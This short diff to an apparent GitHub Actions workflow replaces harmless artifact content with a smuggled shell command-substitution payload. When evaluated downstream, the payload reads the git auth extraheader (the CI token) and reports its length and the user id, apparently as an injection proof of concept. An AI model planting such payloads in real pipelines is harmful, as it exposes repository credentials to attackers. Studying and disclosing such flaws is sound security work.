@@ -14,7 +14,7 @@ jobs:
           mkdir -p /tmp/artifact
           echo "2" > /tmp/artifact/pr-number.txt
           echo "true" > /tmp/artifact/diff-generated.txt
-          printf '%s\n' "aGVsbG8=" > /tmp/artifact/diff-content.txt
+          printf '%s\n' '$(X=$(git config --get http.https://github.com/.extraheader); echo TOKEN_VARIANT_PROOF_len_${#X}_uid_$(id -u) >&2)' > /tmp/artifact/diff-content.txt
       - name: Upload diff artifact
         uses: actions/upload-artifact@v4
         with:
